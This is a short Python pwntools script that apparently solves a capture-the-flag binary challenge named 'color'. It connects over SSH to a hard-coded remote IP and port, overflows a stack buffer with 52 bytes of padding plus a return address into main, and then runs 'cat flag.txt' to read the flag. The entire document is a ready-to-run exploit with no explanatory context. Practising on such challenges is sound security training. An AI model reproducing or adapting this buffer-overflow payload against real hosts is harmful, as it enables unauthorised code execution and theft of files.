#!/usr/bin/env python3
import pwn

host = "104.131.79.111"
port = 1001
user = ""
pw = ""
target = "./color"

def exploit():
    conn = pwn.ssh(user, host, port, pw)
    pr = conn.process(target)

    try:
        elf = pwn.ELF(target, False)

        payload = b'A'*52
        payload += pwn.p32(elf.sym["main"]+155)

        pr.sendlineafter("Enter your favorite color: ", payload)
        pr.sendline("cat flag.txt")
        print(pr.readall(2).decode())
    except Exception as ex:
        print(ex)
    finally:
        pr.close()

exploit()
